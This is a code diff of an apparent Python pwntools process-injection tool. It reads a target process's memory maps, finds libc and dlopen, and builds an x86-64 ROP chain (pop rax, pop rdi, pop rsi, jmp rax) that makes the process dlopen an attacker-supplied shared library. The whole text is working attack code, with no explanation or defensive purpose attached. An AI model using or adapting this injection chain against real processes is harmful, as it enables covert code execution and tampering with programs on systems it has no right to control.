@@ -1,8 +1,5 @@
-import logging
-from ctypes import *
-
+from os import RTLD_LAZY
 from pwn import *
-import os
 
 PAGE_SIZE = 4096
 
@@ -17,6 +14,7 @@ nop = b"\x90\xc3"  # nop; ret;
 jmp_rax = b"\xff\xe0"  # jmp rax;
 pop_rsi = b"\x5e\xc3"  # pop rsi; ret;
 pop_rdi = b"\x5f\xc3"  # pop rdi; ret;
+pop_rax = b"\x58\xc3"  # pop rax; ret;
 mov_rax_rsi = b"\x48\x89\xf0\xc3"  # mov rax, rsi; ret;
 
 GADGET_LIST = {
@@ -24,6 +22,7 @@ GADGET_LIST = {
     "jmp_rax": jmp_rax,
     "pop_rsi": pop_rsi,
     "pop_rdi": pop_rdi,
+    "pop_rax": pop_rax,
     "mov_rax_rsi": mov_rax_rsi
 }
 
@@ -74,6 +73,7 @@ def parse_maps(pid: int) -> dict:
     """
     final = {}
     binaries = []
+    maps = []
     with open(PROC_MAPS.format(pid), "r") as file:
         maps_data = file.read().split("\n")[:-1]
     for entry in maps_data:
@@ -81,7 +81,10 @@ def parse_maps(pid: int) -> dict:
             final["stack"] = parse_maps_entry(entry)
         elif "r-xp" in entry:
             binaries.append(parse_maps_entry(entry))
+        elif "r--p" in entry:
+            maps.append(parse_maps_entry(entry))
     final["bin"] = binaries
+    final["maps"] = maps
     return final
 
 
@@ -128,22 +131,16 @@ def locate_dlopen(pid: int, libc_base: int) -> int:
     :param libc_base: base address of libc in the target process
     :return: the final address of dlopen in the target process
     """
-    libc = CDLL('libc.so.6')
-    dlopen = libc.dlopen
-    address = cast(addressof(dlopen), POINTER(c_ulonglong)).contents.value
-    maps = parse_maps(pid)
-    base = None
-    for entry in maps['bin']:
-        if 'libc.so.6' in entry["name"]:
-            base = int(entry["start"], 16)  # Convert base address to integer
-            break
-    if base is None:
-        raise Exception("could not find libc base address in target process")
-    offset = address - base
-    final_addr = libc_base + offset
-    log.info(f"libc base: {hex(final_addr)}")
-    return final_addr
+    libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
 
+    libc.address = libc_base
+
+    dlopen_addr = libc.symbols["dlopen"]
+
+    log.info(f"libc base: {hex(libc_base)}")
+    log.info(f"dlopen offset in libc: {hex(dlopen_addr)}")
+
+    return dlopen_addr
 
 def dl_open_rop(pid: int, address: int, so_path: str, maps: dict):
     """
@@ -169,9 +166,9 @@ def dl_open_rop(pid: int, address: int, so_path: str, maps: dict):
                 continue
 
     # Find dlopen in libc
-    for binary in maps["bin"]:
-        if 'libc.so.6' in binary["name"]:
-            libc_base = int(binary["start"], 16)  # Convert libc base address to integer
+    for map in maps["maps"]:
+        if 'libc.so.6' in map["name"]:
+            libc_base = int(map["start"], 16)  # Convert libc base address to integer
             dlopen_addr = locate_dlopen(pid=pid, libc_base=libc_base)  # Pass integer libc_base
             break
     else:
@@ -179,14 +176,14 @@ def dl_open_rop(pid: int, address: int, so_path: str, maps: dict):
         exit(1)
 
     rop_chain = (
-        GADGET_LIST["pop_rsi"] +
+        GADGET_LIST["pop_rax"] +
         p64(dlopen_addr) +
-        GADGET_LIST["mov_rax_rsi"] +
-        GADGET_LIST["pop_rsi"] +
-        (2).to_bytes(8, byteorder="little") +
         GADGET_LIST["pop_rdi"] +
-        so_path.encode() +
-        GADGET_LIST["jmp_rax"]
+        p64(address + 0x46) +
+        GADGET_LIST["pop_rsi"] +
+        p64(RTLD_LAZY) +
+        GADGET_LIST["jmp_rax"] +
+        so_path.encode()
     )
 
     return rop_chain
